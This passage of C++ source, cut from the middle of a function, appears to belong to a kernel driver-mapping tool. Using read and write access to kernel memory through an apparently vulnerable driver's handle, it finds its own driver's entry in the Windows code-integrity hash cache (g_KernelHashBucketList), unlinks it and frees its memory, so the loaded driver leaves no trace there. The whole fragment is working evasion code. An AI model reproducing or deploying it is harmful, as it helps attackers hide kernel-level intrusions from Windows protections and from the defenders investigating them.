	HashBucketEntry* prev = (HashBucketEntry*)g_KernelHashBucketList;
	HashBucketEntry* entry = 0;
	if (!ReadMemory(device_handle, (uintptr_t)prev, &entry, sizeof(entry))) {
		Log(L"[-] Failed to read first g_KernelHashBucketList entry!" << std::endl);
		if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
			Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
		}
		return false;
	}
	if (!entry) {
		Log(L"[!] g_KernelHashBucketList looks empty!" << std::endl);
		if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
			Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
		}
		return true;
	}

	std::wstring wdname = GetDriverNameW();
	std::wstring search_path = GetDriverPath();
	SIZE_T expected_len = (search_path.length() - 2) * 2;

	while (entry) {

		USHORT wsNameLen = 0;
		if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Length), &wsNameLen, sizeof(wsNameLen)) || wsNameLen == 0) {
			Log(L"[-] Failed to read g_KernelHashBucketList entry text len!" << std::endl);
			if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
				Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
			}
			return false;
		}

		if (expected_len == wsNameLen) {
			wchar_t* wsNamePtr = 0;
			if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Buffer), &wsNamePtr, sizeof(wsNamePtr)) || !wsNamePtr) {
				Log(L"[-] Failed to read g_KernelHashBucketList entry text ptr!" << std::endl);
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
				}
				return false;
			}

			wchar_t* wsName = new wchar_t[(ULONG64)wsNameLen / 2ULL + 1ULL];
			memset(wsName, 0, wsNameLen + sizeof(wchar_t));

			if (!ReadMemory(device_handle, (uintptr_t)wsNamePtr, wsName, wsNameLen)) {
				Log(L"[-] Failed to read g_KernelHashBucketList entry text!" << std::endl);
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
				}
				return false;
			}

			size_t find_result = std::wstring(wsName).find(wdname);
			if (find_result != std::wstring::npos) {
				Log(L"[+] Found In g_KernelHashBucketList: " << std::wstring(&wsName[find_result]) << std::endl);
				HashBucketEntry* Next = 0;
				if (!ReadMemory(device_handle, (uintptr_t)entry, &Next, sizeof(Next))) {
					Log(L"[-] Failed to read g_KernelHashBucketList next entry ptr!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}

				if (!WriteMemory(device_handle, (uintptr_t)prev, &Next, sizeof(Next))) {
					Log(L"[-] Failed to write g_KernelHashBucketList prev entry ptr!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}

				if (!FreePool(device_handle, (uintptr_t)entry)) {
					Log(L"[-] Failed to clear g_KernelHashBucketList entry pool!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}
				Log(L"[+] g_KernelHashBucketList Cleaned" << std::endl);
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}
				delete[] wsName;
				return true;
			}
			delete[] wsName;
		}
		prev = entry;
		//read next
		if (!ReadMemory(device_handle, (uintptr_t)entry, &entry, sizeof(entry))) {
			Log(L"[-] Failed to read g_KernelHashBucketList next entry!" << std::endl);
			if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
				Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
			}
			return false;
		}
	}

	if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
		Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
	}
	return false;
}